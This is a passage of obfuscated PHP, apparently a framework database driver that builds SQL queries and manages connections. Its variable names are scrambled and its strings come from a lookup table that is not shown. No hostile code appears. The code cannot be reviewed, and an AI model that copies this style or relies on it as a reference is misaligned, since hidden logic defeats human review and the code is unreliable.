? $öä¡’Éü[$µÛ×æ™Ô[977]] : array()); } elseif (empty($öä¡’Éü)) { if (think_config($µÛ×æ™Ô[978]) && $µÛ×æ™Ô[967] != strtolower(think_config($µÛ×æ™Ô[979]))) { $öä¡’Éü = $this->parseDSN(think_config($µÛ×æ™Ô[978])); } else { $öä¡’Éü = array($µÛ×æ™Ô[964] => think_config($µÛ×æ™Ô[979]), $µÛ×æ™Ô[891] => think_config($µÛ×æ™Ô[980]), $µÛ×æ™Ô[892] => think_config($µÛ×æ™Ô[981]), $µÛ×æ™Ô[889] => think_config($µÛ×æ™Ô[982]), $µÛ×æ™Ô[890] => think_config($µÛ×æ™Ô[983]), $µÛ×æ™Ô[21] => think_config($µÛ×æ™Ô[246]), $µÛ×æ™Ô[919] => think_config($µÛ×æ™Ô[978]), $µÛ×æ™Ô[17] => think_config($µÛ×æ™Ô[984])); } } return $öä¡’Éü; } protected function initConnect($ Í’àÇú = true) { if (1 == think_config($_SERVER[ïëó©ÒÚ][22])) { $this->_linkID = $this->multiConnect($ Í’àÇú); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $ÒÍ¹×ó¿ => $Ú„é¬¢ë) { $this->_linkID = $Ú„é¬¢ë; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($›¹“‚Â = false) { $û‰¿´ÏÅ =& $_SERVER[ïëó©ÒÚ]; static $öôŞÎš = array(); static $›‡Ğ¥§× = -1; if (empty($öôŞÎš)) { foreach ($this->config as $ÒÄìéÔÓ => $Óµ²ôşç) { $öôŞÎš[$ÒÄìéÔÓ] = explode($û‰¿´ÏÅ[50], $Óµ²ôşç); } } if (think_config($û‰¿´ÏÅ[985])) { if ($›¹“‚Â || think_config($û‰¿´ÏÅ[395]) === !0) { $‹”Ü²ş­ = floor(mt_rand(0, think_config($û‰¿´ÏÅ[986]) - 1)); $›‡Ğ¥§× = $‹”Ü²ş­; } else { if (is_numeric(think_config($û‰¿´ÏÅ[987]))) { $‹”Ü²ş­ = think_config($û‰¿´ÏÅ[987]); } else { $‹”Ü²ş­ = floor(mt_rand(think_config($û‰¿´ÏÅ[986]), count($öôŞÎš[$û‰¿´ÏÅ[889]]) - 1)); } } } else { $‹”Ü²ş­ = floor(mt_rand(0, count($öôŞÎš[$û‰¿´ÏÅ[889]]) - 1)); $›‡Ğ¥§× = $‹”Ü²ş­; } $‹”Ü²ş­ = $›‡Ğ¥§× !== -1 ? $›‡Ğ¥§× : $‹”Ü²ş­; $¼Äİú·õ = array($û‰¿´ÏÅ[891] => isset($öôŞÎš[$û‰¿´ÏÅ[891]][$‹”Ü²ş­]) ? $öôŞÎš[$û‰¿´ÏÅ[891]][$‹”Ü²ş­] : $öôŞÎš[$û‰¿´ÏÅ[891]][0], $û‰¿´ÏÅ[892] => isset($öôŞÎš[$û‰¿´ÏÅ[892]][$‹”Ü²ş­]) ? $öôŞÎš[$û‰¿´ÏÅ[892]][$‹”Ü²ş­] : $öôŞÎš[$û‰¿´ÏÅ[892]][0], $û‰¿´ÏÅ[889] => isset($öôŞÎš[$û‰¿´ÏÅ[889]][$‹”Ü²ş­]) ? $öôŞÎš[$û‰¿´ÏÅ[889]][$‹”Ü²ş­] : $öôŞÎš[$û‰¿´ÏÅ[889]][0], $û‰¿´ÏÅ[890] => isset($öôŞÎš[$û‰¿´ÏÅ[890]][$‹”Ü²ş­]) ? $öôŞÎš[$û‰¿´ÏÅ[890]][$‹”Ü²ş­] : $öôŞÎš[$û‰¿´ÏÅ[890]][0], $û‰¿´ÏÅ[21] => isset($öôŞÎš[$û‰¿´ÏÅ[21]][$‹”Ü²ş­]) ? $öôŞÎš[$û‰¿´ÏÅ[21]][$‹”Ü²ş­] : $öôŞÎš[$û‰¿´ÏÅ[21]][0], $û‰¿´ÏÅ[919] => isset($öôŞÎš[$û‰¿´ÏÅ[919]][$‹”Ü²ş­]) ? $öôŞÎš[$û‰¿´ÏÅ[919]][$‹”Ü²ş­] : $öôŞÎš[$û‰¿´ÏÅ[919]][0], $û‰¿´ÏÅ[17] => isset($öôŞÎš[$û‰¿´ÏÅ[17]][$‹”Ü²ş­]) ? $öôŞÎš[$û‰¿´ÏÅ[17]][$‹”Ü²ş­] : $öôŞÎš[$û‰¿´ÏÅ[17]][0]); return $this->connect($¼Äİú·õ, $‹”Ü²ş­); } public function parseDSN($©õç¹×Ÿ) { $àç•©™Ï =& $_SERVER[ïëó©ÒÚ]; if (empty($©õç¹×Ÿ)) { return !1; } $¨éŸïşÔ = parse_url($©õç¹×Ÿ); if ($¨éŸïşÔ[$àç•©™Ï[180]]) { $ƒÒÎ­é³ = array($àç•©™Ï[964] => $¨éŸïşÔ[$àç•©™Ï[180]], $àç•©™Ï[891] => isset($¨éŸïşÔ[$àç•©™Ï[609]]) ? $¨éŸïşÔ[$àç•©™Ï[609]] : $àç•©™Ï[12], $àç•©™Ï[892] => isset($¨éŸïşÔ[$àç•©™Ï[988]]) ? $¨éŸïşÔ[$àç•©™Ï[988]] : $àç•©™Ï[12], $àç•©™Ï[889] => isset($¨éŸïşÔ[$àç•©™Ï[181]]) ? $¨éŸïşÔ[$àç•©™Ï[181]] : $àç•©™Ï[12], $àç•©™Ï[890] => isset($¨éŸïşÔ[$àç•©™Ï[182]]) ? $¨éŸïşÔ[$àç•©™Ï[182]] : $àç•©™Ï[12], $àç•©™Ï[21] => isset($¨éŸïşÔ[$àç•©™Ï[84]]) ? substr($¨éŸïşÔ[$àç•©™Ï[84]], 1) : $àç•©™Ï[12]); } else { preg_match($àç•©™Ï[989], trim($©õç¹×Ÿ), $òË¢€‚); $ƒÒÎ­é³ = array($àç•©™Ï[964] => $òË¢€‚[1], $àç•©™Ï[891] => $òË¢€‚[2], $àç•©™Ï[892] => $òË¢€‚[3], $àç•©™Ï[889] => $òË¢€‚[4], $àç•©™Ï[890] => $òË¢€‚[5], $àç•©™Ï[21] => $òË¢€‚[6]); } $ƒÒÎ­é³[$àç•©™Ï[919]] = $àç•©™Ï[12]; return $ƒÒÎ­é³; } protected function debug() { $Ø²”Ùó– =& $_SERVER[ïëó©ÒÚ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $Ø²”Ùó–[990]; if (think_config($Ø²”Ùó–[991])) { think_status($Ø²”Ùó–[992]); think_trace($this->queryStr . $Ø²”Ùó–[993] . think_status($Ø²”Ùó–[24], $Ø²”Ùó–[992], 6) . $Ø²”Ùó–[994], $Ø²”Ùó–[12], $Ø²”Ùó–[995]); } } protected function parseLock($ü©ÉƒÔÃ = false) { $™¡À«øŞ =& $_SERVER[ïëó©ÒÚ]; if (!$ü©ÉƒÔÃ) { return $™¡À«øŞ[12]; } if ($™¡À«øŞ[921] == $this->dbType) { return $™¡À«øŞ[996]; } return $™¡À«øŞ[997]; } protected function parseSet($±æØèèØ) { $Æ´¿ü®Ç =& $_SERVER[ïëó©ÒÚ]; foreach ($±æØèèØ as $Ùä‰‘éÎ => $àĞ–¤‘ª) { if (is_array($àĞ–¤‘ª) && $Æ´¿ü®Ç[297] == $àĞ–¤‘ª[0]) { $ÁŸ†æÌ–[] = $this->parseKey($Ùä‰‘éÎ) . $Æ´¿ü®Ç[887] . $àĞ–¤‘ª[1]; } elseif (is_scalar($àĞ–¤‘ª) || is_null($àĞ–¤‘ª)) { $ÁŸ†æÌ–[] = $this->parseKey($Ùä‰‘éÎ) . $Æ´¿ü®Ç[887] . $this->parseValue($àĞ–¤‘ª); } } return $Æ´¿ü®Ç[998] . implode($Æ´¿ü®Ç[50], $ÁŸ†æÌ–); } protected function bindParam($¢èİ™ß, $ØÀ´ë·) { $this->bind[$_SERVER[ïëó©ÒÚ][4] . $¢èİ™ß] = $ØÀ´ë·; } protected function parseBind($´¢ÈÄ•Ï) { $´¢ÈÄ•Ï = array_merge($this->bind, $´¢ÈÄ•Ï); $this->bind = array(); return $´¢ÈÄ•Ï; } function parseKey(&$­õ£Ïª¥, $Î‹Á€µæ = true) { if ($Î‹Á€µæ) { $­õ£Ïª¥ = $this->parseKeyCheck($­õ£Ïª¥); } return $­õ£Ïª¥; } function parseKeyCheck($ø°š”Ìş) { $•æ›Íºâ =& $_SERVER[ïëó©ÒÚ]; $ø°š”Ìş = trim($ø°š”Ìş); if (!preg_match($•æ›Íºâ[999], $ø°š”Ìş)) { think_exception($•æ›Íºâ[1000] . $ø°š”Ìş); } return $ø°š”Ìş; } protected function parseValue($ÃîÒÔ´) { $¤¹Ä»î =& $_SERVER[ïëó©ÒÚ]; if (is_string($ÃîÒÔ´)) { $ÃîÒÔ´ = $¤¹Ä»î[960] . $this->escapeString($ÃîÒÔ´) . $¤¹Ä»î[960]; } elseif (isset($ÃîÒÔ´[0]) && is_string($ÃîÒÔ´[0]) && strtolower($ÃîÒÔ´[0]) == $¤¹Ä»î[297]) { $ÃîÒÔ´ = $this->escapeString($ÃîÒÔ´[1]); } elseif (is_array($ÃîÒÔ´)) { $ÃîÒÔ´ = array_map(array($this, $¤¹Ä»î[961]), $ÃîÒÔ´); } elseif (is_bool($ÃîÒÔ´)) { $ÃîÒÔ´ = $ÃîÒÔ´ ? $¤¹Ä»î[88] : $¤¹Ä»î[197]; } elseif (is_null($ÃîÒÔ´)) { $ÃîÒÔ´ = $¤¹Ä»î[103]; } return $ÃîÒÔ´; } protected function parseField($‰‡Ìƒø») { $ËŞ”˜Ì =& $_SERVER[ïëó©ÒÚ]; if (is_string($‰‡Ìƒø») && strpos($‰‡Ìƒø», $ËŞ”˜Ì[50])) { $‰‡Ìƒø» = explode($ËŞ”˜Ì[50], $‰‡Ìƒø»); } if (is_array($‰‡Ìƒø»)) { $Íˆ…æ‡ = array(); foreach ($‰‡Ìƒø» as $òÁ­ê¼¾ => $½Ûë×É‘) { if (!is_numeric($òÁ­ê¼¾)) { $Íˆ…æ‡[] = $this->parseKey($òÁ­ê¼¾, !1) . $ËŞ”˜Ì[1001] . $this->parseKey($½Ûë×É‘); } else { $Íˆ…æ‡[] = $this->parseKey($½Ûë×É‘); } } $ã‰Åá = implode($ËŞ”˜Ì[50], $Íˆ…æ‡); } elseif (is_string($‰‡Ìƒø») && !empty($‰‡Ìƒø»)) { $ã‰Åá = $‰‡Ìƒø»; } else { $ã‰Åá = $ËŞ”˜Ì[188]; } return $ã‰Åá; } protected function parseTable($¼Ûø¦Ì‚) { $Î¶ğÂ·Ë =& $_SERVER[ïëó©ÒÚ]; if (is_array($¼Ûø¦Ì‚)) { $‡ÇÕñ–Ä = array(); foreach ($¼Ûø¦Ì‚ as $½ÔøëŠ¬ => $‰ú¾ÈÙ§) { if (!is_numeric($½ÔøëŠ¬)) { $‡ÇÕñ–Ä[] = $this->parseKey($½ÔøëŠ¬) . $Î¶ğÂ·Ë[53] . $this->parseKey($‰ú¾ÈÙ§); } else { $‡ÇÕñ–Ä[] = $this->parseKey($½ÔøëŠ¬); } } $¼Ûø¦Ì‚ = $‡ÇÕñ–Ä; } elseif (is_string($¼Ûø¦Ì‚)) { if (strstr($¼Ûø¦Ì‚, $Î¶ğÂ·Ë[53])) { return $¼Ûø¦Ì‚; } $¼Ûø¦Ì‚ = explode($Î¶ğÂ·Ë[50], $¼Ûø¦Ì‚); array_walk($¼Ûø¦Ì‚, array($this, $Î¶ğÂ·Ë[909])); } return $Î¶ğÂ·Ë[903] . trim(implode($Î¶ğÂ·Ë[1002], $¼Ûø¦Ì‚), $Î¶ğÂ·Ë[385]) . $Î¶ğÂ·Ë[903]; } protected function parseWhere($êüò™“õ) { $•¡›İá =& $_SERVER[ïëó©ÒÚ]; $¯š ìÄÙ = $•¡›İá[12]; if (is_string($êüò™“õ)) { $¯š ìÄÙ = $êüò™“õ; } else { $¤é»ìµ· = isset($êüò™“õ[$•¡›İá[1003]]) ? strtoupper($êüò™“õ[$•¡›İá[1003]]) : $•¡›İá[12]; if (in_array($¤é»ìµ·, array($•¡›İá[1004], $•¡›İá[1005], $•¡›İá[1006]))) { $¤é»ìµ· = $•¡›İá[53] . $¤é»ìµ· . $•¡›İá[53]; unset($êüò™“õ[$•¡›İá[1003]]); } else { $¤é»ìµ· = $•¡›İá[1007]; } foreach ($êüò™“õ as $ ­îô‰â => $¾’Äáª¼) { $¯š ìÄÙ .= $•¡›İá[277]; if (is_numeric($ ­îô‰â)) { $ ­îô‰â = $•¡›İá[1008]; } if (0 === strpos($ ­îô‰â, $•¡›İá[11])) { $¯š ìÄÙ .= $this->parseThinkWhere($ ­îô‰â, $¾’Äáª¼); } else { if (!preg_match($•¡›İá[1009], trim($ ­îô‰â))) { think_exception(think_lang($•¡›İá[1010]) . $•¡›İá[4] . $ ­îô‰â); } $¹ºñòé = is_array($¾’Äáª¼) && isset($¾’Äáª¼[$•¡›İá[1011]]); $ ­îô‰â = trim($ ­îô‰â); if (strpos($ ­îô‰â, $•¡›İá[283])) { $¹³ãÅ¡Ñ = explode($•¡›İá[283], $ ­îô‰â); $ÀåÆ•Ş™ = array(); foreach ($¹³ãÅ¡Ñ as $èìçÏ => $Œ´Ç¥³Ú) { $ÎòÉ¦‚¡ = $¹ºñòé ? $¾’Äáª¼[$èìçÏ] : $¾’Äáª¼; $ÀåÆ•Ş™[] = $•¡›İá[260] . $this->parseWhereItem($this->parseKey($Œ´Ç¥³Ú), $ÎòÉ¦‚¡) . $•¡›İá[908]; } $¯š ìÄÙ .= implode($•¡›İá[1012], $ÀåÆ•Ş™); } elseif (strpos($ ­îô‰â, $•¡›İá[284])) { $¹³ãÅ¡Ñ = explode($•¡›İá[284], $ ­îô‰â); $ÀåÆ•Ş™ = array(); foreach ($¹³ãÅ¡Ñ as $èìçÏ => $Œ´Ç¥³Ú) { $ÎòÉ¦‚¡ = $¹ºñòé ? $¾’Äáª¼[$èìçÏ] : $¾’Äáª¼; $ÀåÆ•Ş™[] = $•¡›İá[260] . $this->parseWhereItem($this->parseKey($Œ´Ç¥³Ú), $ÎòÉ¦‚¡) . $•¡›İá[908]; } $¯š ìÄÙ .= implode($•¡›İá[1007], $ÀåÆ•Ş™); } else { $¯š ìÄÙ .= $this->parseWhereItem($this->parseKey($ ­îô‰â), $¾’Äáª¼); } } $¯š ìÄÙ .= $•¡›İá[278] . $¤é»ìµ·; } $¯š ìÄÙ = substr($¯š ìÄÙ, 0, -strlen($¤é»ìµ·)); } return empty($¯š ìÄÙ) ? $•¡›İá[12] : $•¡›İá[1013] . $¯š ìÄÙ; } protected function parseWhereItem($«‡ŸÛ³î, $ÂÓŠ ÌŒ) { $ÈÌ›²ÇŸ =& $_SERVER[ïëó©ÒÚ]; $¦˜ÇƒÛÚ = $ÈÌ›²ÇŸ[12]; if (is_array($ÂÓŠ ÌŒ)) { if (is_string($ÂÓŠ ÌŒ[0])) { $®’ƒä½ = strtolower($ÂÓŠ ÌŒ[0]); if (in_array($ÂÓŠ ÌŒ[0], array($ÈÌ›²ÇŸ[887], $ÈÌ›²ÇŸ[1014], $ÈÌ›²ÇŸ[1015], $ÈÌ›²ÇŸ[1016], $ÈÌ›²ÇŸ[1017], $ÈÌ›²ÇŸ[1018]))) { $¦˜ÇƒÛÚ .= $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $ÂÓŠ ÌŒ[0] . $ÈÌ›²ÇŸ[53] . $this->parseValue($ÂÓŠ ÌŒ[1]); } elseif (preg_match($ÈÌ›²ÇŸ[1019], $ÂÓŠ ÌŒ[0])) { $¦˜ÇƒÛÚ .= $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $this->exp[$®’ƒä½] . $ÈÌ›²ÇŸ[53] . $this->parseValue($ÂÓŠ ÌŒ[1]); } elseif (preg_match($ÈÌ›²ÇŸ[1020], $ÂÓŠ ÌŒ[0])) { if (is_array($ÂÓŠ ÌŒ[1])) { $Éó„óŠÂ = isset($ÂÓŠ ÌŒ[2]) ? strtoupper($ÂÓŠ ÌŒ[2]) : $ÈÌ›²ÇŸ[1005]; if (in_array($Éó„óŠÂ, array($ÈÌ›²ÇŸ[1004], $ÈÌ›²ÇŸ[1005], $ÈÌ›²ÇŸ[1006]))) { $‰Ì£¨ÜĞ = array(); foreach ($ÂÓŠ ÌŒ[1] as $¯¸ÂÒÒ) { $‰Ì£¨ÜĞ[] = $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $this->exp[$®’ƒä½] . $ÈÌ›²ÇŸ[53] . $this->parseValue($¯¸ÂÒÒ); } $¦˜ÇƒÛÚ .= $ÈÌ›²ÇŸ[260] . implode($ÈÌ›²ÇŸ[53] . $Éó„óŠÂ . $ÈÌ›²ÇŸ[53], $‰Ì£¨ÜĞ) . $ÈÌ›²ÇŸ[908]; } } else { $¦˜ÇƒÛÚ .= $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $this->exp[$®’ƒä½] . $ÈÌ›²ÇŸ[53] . $this->parseValue($ÂÓŠ ÌŒ[1]); } } elseif ($ÈÌ›²ÇŸ[297] == $®’ƒä½) { $¦˜ÇƒÛÚ .= $ÈÌ›²ÇŸ[906] . $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $ÂÓŠ ÌŒ[1] . $ÈÌ›²ÇŸ[1021]; } elseif (preg_match($ÈÌ›²ÇŸ[1022], $ÂÓŠ ÌŒ[0])) { $¦˜ÇƒÛÚ .= $ÂÓŠ ÌŒ[0]; } elseif (preg_match($ÈÌ›²ÇŸ[1023], $ÂÓŠ ÌŒ[0])) { if (isset($ÂÓŠ ÌŒ[2]) && $ÈÌ›²ÇŸ[297] == $ÂÓŠ ÌŒ[2]) { $¦˜ÇƒÛÚ .= $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $this->exp[$®’ƒä½] . $ÈÌ›²ÇŸ[53] . $ÂÓŠ ÌŒ[1]; } else { if (is_string($ÂÓŠ ÌŒ[1])) { $ÂÓŠ ÌŒ[1] = explode($ÈÌ›²ÇŸ[50], $ÂÓŠ ÌŒ[1]); } $ÇÓÙ…ë = implode($ÈÌ›²ÇŸ[50], $this->parseValue($ÂÓŠ ÌŒ[1])); $¦˜ÇƒÛÚ .= $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $this->exp[$®’ƒä½] . $ÈÌ›²ÇŸ[906] . $ÇÓÙ…ë . $ÈÌ›²ÇŸ[908]; } } elseif (preg_match($ÈÌ›²ÇŸ[1024], $ÂÓŠ ÌŒ[0])) { $œ¾›Èµ = is_string($ÂÓŠ ÌŒ[1]) ? explode($ÈÌ›²ÇŸ[50], $ÂÓŠ ÌŒ[1]) : $ÂÓŠ ÌŒ[1]; $¦˜ÇƒÛÚ .= $ÈÌ›²ÇŸ[906] . $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $this->exp[$®’ƒä½] . $ÈÌ›²ÇŸ[53] . $this->parseValue($œ¾›Èµ[0]) . $ÈÌ›²ÇŸ[1007] . $this->parseValue($œ¾›Èµ[1]) . $ÈÌ›²ÇŸ[278]; } else { think_exception(think_lang($ÈÌ›²ÇŸ[1010]) . $ÈÌ›²ÇŸ[4] . $ÂÓŠ ÌŒ[0]); } } else { $²Áò‹ = count($ÂÓŠ ÌŒ); $ñ—‰çöÊ = $ÈÌ›²ÇŸ[12]; if (is_string($ÂÓŠ ÌŒ[$²Áò‹ - 1])) { $ñ—‰çöÊ = isset($ÂÓŠ ÌŒ[$²Áò‹ - 1]) ? strtoupper($ÂÓŠ ÌŒ[$²Áò‹ - 1]) : $ÈÌ›²ÇŸ[12]; if (in_array($ñ—‰çöÊ, array($ÈÌ›²ÇŸ[1004], $ÈÌ›²ÇŸ[1005], $ÈÌ›²ÇŸ[1006]))) { $²Áò‹ = $²Áò‹ - 1; } } else { $ñ—‰çöÊ = $ÈÌ›²ÇŸ[1004]; } for ($€öÍÙ¡ = 0; $€öÍÙ¡ < $²Áò‹; $€öÍÙ¡++) { $œ¾›Èµ = is_array($ÂÓŠ ÌŒ[$€öÍÙ¡]) ? $ÂÓŠ ÌŒ[$€öÍÙ¡][1] : $ÂÓŠ ÌŒ[$€öÍÙ¡]; if ($ÈÌ›²ÇŸ[297] == strtolower($ÂÓŠ ÌŒ[$€öÍÙ¡][0])) { $¦˜ÇƒÛÚ .= $ÈÌ›²ÇŸ[260] . $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $œ¾›Èµ . $ÈÌ›²ÇŸ[1021] . $ñ—‰çöÊ . $ÈÌ›²ÇŸ[53]; } else { $Éºãøê± = is_array($ÂÓŠ ÌŒ[$€öÍÙ¡]) ? $this->exp[strtolower($ÂÓŠ ÌŒ[$€öÍÙ¡][0])] : $ÈÌ›²ÇŸ[887]; if (!$Éºãøê± && is_array($ÂÓŠ ÌŒ[$€öÍÙ¡]) && in_array($ÂÓŠ ÌŒ[$€öÍÙ¡][0], array($ÈÌ›²ÇŸ[887], $ÈÌ›²ÇŸ[1014], $ÈÌ›²ÇŸ[1015], $ÈÌ›²ÇŸ[1016], $ÈÌ›²ÇŸ[1017], $ÈÌ›²ÇŸ[1018]))) { $Éºãøê± = $ÂÓŠ ÌŒ[$€öÍÙ¡][0]; } $¦˜ÇƒÛÚ .= $ÈÌ›²ÇŸ[260] . $«‡ŸÛ³î . $ÈÌ›²ÇŸ[53] . $Éºãøê± . $ÈÌ›²ÇŸ[53] . $this->parseValue($œ¾›Èµ) . $ÈÌ›²ÇŸ[1021] . $ñ—‰çöÊ . $ÈÌ›²ÇŸ[53]; } } $¦˜ÇƒÛÚ = substr($¦˜ÇƒÛÚ, 0, -4); } } else { $¦˜ÇƒÛÚ .= $«‡ŸÛ³î . $ÈÌ›²ÇŸ[1025] . $this->parseValue($ÂÓŠ ÌŒ); } return $¦˜ÇƒÛÚ; } protected function parseThinkWhere($Š€»„•…, $ìĞëÚûô) { $Ò„Ï±ß´ =& $_SERVER[ïëó©ÒÚ]; $Í”Ôè€ = $Ò„Ï±ß´[12]; switch ($Š€»„•…) { case $Ò„Ï±ß´[352]: $Í”Ôè€ = $ìĞëÚûô; break; case $Ò„Ï±ß´[1008]: $Í”Ôè€ = is_string($ìĞëÚûô) ? $ìĞëÚûô : substr($this->parseWhere($ìĞëÚûô), 6); break; case $Ò„Ï±ß´[1026]: parse_str($ìĞëÚûô, $ãá¦¢¬í); if (isset($ãá¦¢¬í[$Ò„Ï±ß´[1003]])) { $‰ËŞíˆ™ = $Ò„Ï±ß´[53] . strtoupper($ãá¦¢¬í[$Ò„Ï±ß´[1003]]) . $Ò„Ï±ß´[53]; unset($ãá¦¢¬í[$Ò„Ï±ß´[1003]]); } else { $‰ËŞíˆ™ = $Ò„Ï±ß´[1007]; } $Â§é¸Öò = array(); foreach ($ãá¦¢¬í as $¤¯´Ê÷ => $¯áå³ßÅ) { $Â§é¸Öò[] = $this->parseKey($¤¯´Ê÷) . $Ò„Ï±ß´[1025] . $this->parseValue($¯áå³ßÅ); } $Í”Ôè€ = implode($‰ËŞíˆ™, $Â§é¸Öò); break; } return $Í”Ôè€; } protected function parseLimit($ıîóÆò) { $úİş¢¨† =& $_SERVER[ïëó©ÒÚ]; return !empty($ıîóÆò) ? $úİş¢¨†[51] . $ıîóÆò . $úİş¢¨†[53] : $úİş¢¨†[12]; } protected function parseJoin($§ÊÏç‰) { $îÖèØĞ =& $_SERVER[ïëó©ÒÚ]; $ß¢ÛâŒ­ = $îÖèØĞ[12]; if (!empty($§ÊÏç‰)) { if (is_array($§ÊÏç‰)) { foreach ($§ÊÏç‰ as $ç’ûïÌŒ => $Šµİç‡ã) { if (!1 !== stripos($Šµİç‡ã, $îÖèØĞ[1027])) { $ß¢ÛâŒ­ .= $îÖèØĞ[53] . $Šµİç‡ã; } else { $ß¢ÛâŒ­ .= $îÖèØĞ[1028] . $Šµİç‡ã; } } } else { $ß¢ÛâŒ­ .= $îÖèØĞ[1028] . $§ÊÏç‰; } } $ß¢ÛâŒ­ = preg_replace($îÖèØĞ[1029], think_config($îÖèØĞ[933]) . $îÖèØĞ[1030], $ß¢ÛâŒ­); return $ß¢ÛâŒ­; } protected function parseOrder($€åó¥“Ï) { $‘ Øò„Ë =& $_SERVER[ïëó©ÒÚ]; if (is_array($€åó¥“Ï)) { $ìäû“¸© = array(); foreach ($€åó¥“Ï as $ÙÁ•»Ô => $´¾ÌÕûÀ) { if (is_numeric($ÙÁ•»Ô)) { $ìäû“¸©[] = $this->parseKey($´¾ÌÕûÀ); } else { $´¾ÌÕûÀ = in_array(strtoupper(trim($´¾ÌÕûÀ)), array($‘ Øò„Ë[1031], $‘ Øò„Ë[1032])) ? $‘ Øò„Ë[53] . $´¾ÌÕûÀ : $‘ Øò„Ë[12]; if (preg_match($‘ Øò„Ë[1033], $ÙÁ•»Ô)) { $ìäû“¸©[] = $this->parseKey($ÙÁ•»Ô) . $´¾ÌÕûÀ; } else { think_exception($‘ Øò„Ë[1034] . $ÙÁ•»Ô); } } } $€åó¥“Ï = implode($‘ Øò„Ë[50], $ìäû“¸©); } return !empty($€åó¥“Ï) ? $‘ Øò„Ë[1035] . $€åó¥“Ï : $‘ Øò„Ë[12]; } protected function parseGroup($ÄÚ…½í®) { $§ƒÁÁ³Ù =& $_SERVER[ïëó©ÒÚ]; return !empty($ÄÚ…½í®) ? $§ƒÁÁ³Ù[1036] . $ÄÚ…½í® : $§ƒÁÁ³Ù[12]; } protected function parseHaving($Üñç•) { $æ¼“ßôå =& $_SERVER[ïëó©ÒÚ]; return !empty($Üñç•) ? $æ¼“ßôå[1037] . $Üñç• : $æ¼“ßôå[12]; } protected function parseComment($Ó—ü¢˜») { $˜¡¸ÎéÖ =& $_SERVER[ïëó©ÒÚ]; return !empty($Ó—ü¢˜») ? $˜¡¸ÎéÖ[1038] . $Ó—ü¢˜» . $˜¡¸ÎéÖ[1039] : $˜¡¸ÎéÖ[12]; } protected function parseDistinct($æöûË‡û) { $ìÏË¦À =& $_SERVER[ïëó©ÒÚ]; return !empty($æöûË‡û) ? $ìÏË¦À[1040] : $ìÏË¦À[12]; } protected function parseUnion($ÂıŸÌÙ) { $øç©˜¿ =& $_SERVER[ïëó©ÒÚ]; if (empty($ÂıŸÌÙ)) { return $øç©˜¿[12]; } if (isset($ÂıŸÌÙ[$øç©˜¿[348]])) { $ï“¬À‚ = $øç©˜¿[1041]; unset($ÂıŸÌÙ[$øç©˜¿[348]]); } else { $ï“¬À‚ = $øç©˜¿[1042]; } foreach ($ÂıŸÌÙ as $¦ï´¹öø) { $­ÊÙ¤[] = $ï“¬À‚ . (is_array($¦ï´¹öø) ? $this->buildSelectSql($¦ï´¹öø) : $¦ï´¹öø); } return implode($øç©˜¿[53], $­ÊÙ¤); } public function insert($Ëˆã‰Ü, $ç¾õ·öÆ = array(), $®Ö¯ş’Ì = false) { $ÇæœÈÒ¾ =& $_SERVER[ïëó©ÒÚ]; $Î Î Üõ = $¶ÃŠù¨ = array(); $this->model = $ç¾õ·öÆ[$ÇæœÈÒ¾[281]]; foreach ($Ëˆã‰Ü as $‚€îûŸÉ => $Œè†ç‘‚) { if (is_array($Œè†ç‘‚) && $ÇæœÈÒ¾[297] == $Œè†ç‘‚[0]) { $¶ÃŠù¨[] = $this->parseKey($‚€îûŸÉ); $Î Î Üõ[] = $Œè†ç‘‚[1]; } elseif (is_scalar($Œè†ç‘‚) || is_null($Œè†ç‘‚)) { $¶ÃŠù¨[] = $this->parseKey($‚€îûŸÉ); $Î Î Üõ[] = $this->parseValue($Œè†ç‘‚); } } $ßˆ˜ª× = ($®Ö¯ş’Ì ? $ÇæœÈÒ¾[910] : $ÇæœÈÒ¾[911]) . $ÇæœÈÒ¾[912] . $this->parseTable($ç¾õ·öÆ[$ÇæœÈÒ¾[279]]) . $ÇæœÈÒ¾[906] . implode($ÇæœÈÒ¾[50], $¶ÃŠù¨) . $ÇæœÈÒ¾[907] . implode($ÇæœÈÒ¾[50], $Î Î Üõ) . $ÇæœÈÒ¾[908]; $ßˆ˜ª× .= $this->parseLock(isset($ç¾õ·öÆ[$ÇæœÈÒ¾[853]]) ? $ç¾õ·öÆ[$ÇæœÈÒ¾[853]] : !1); $ßˆ˜ª× .= $this->parseComment(!empty($ç¾õ·öÆ[$ÇæœÈÒ¾[354]]) ? $ç¾õ·öÆ[$ÇæœÈÒ¾[354]] : $ÇæœÈÒ¾[12]); return $this->execute($ßˆ˜ª×, $this->parseBind(!empty($ç¾õ·öÆ[$ÇæœÈÒ¾[285]]) ? $ç¾õ·öÆ[$ÇæœÈÒ¾[285]] : array())); } public function selectInsert($²”ø™, $óä£ÒÉ”, $·üÚ’Û¢ = array()) { $ƒëÊ²Œ =& $_SERVER[ïëó©ÒÚ]; $this->model = $·üÚ’Û¢[$ƒëÊ²Œ[281]]; if (is_string($²”ø™)) { $²”ø™ = explode($ƒëÊ²Œ[50], $²”ø™); } array_walk($²”ø™, array($this, $ƒëÊ²Œ[909])); $ÏÜ±úïö = $ƒëÊ²Œ[1043] . $this->parseTable($óä£ÒÉ”) . $ƒëÊ²Œ[906] . implode($ƒëÊ²Œ[50], $²”ø™) . $ƒëÊ²Œ[1021]; $ÏÜ±úïö .= $this->buildSelectSql($·üÚ’Û¢); return $this->execute($ÏÜ±úïö, $this->parseBind(!empty($·üÚ’Û¢[$ƒëÊ²Œ[285]]) ? $·üÚ’Û¢[$ƒëÊ²Œ[285]] : array())); } public function update($ê©‰ğá½, $·çØÙ…û) { $›ıõğä— =& $_SERVER[ïëó©ÒÚ]; $this->model = $·çØÙ…û[$›ıõğä—[281]]; $³ä¬ïö = $›ıõğä—[1044] . $this->parseTable($·çØÙ…û[$›ıõğä—[279]]) . $this->parseSet($ê©‰ğá½) . 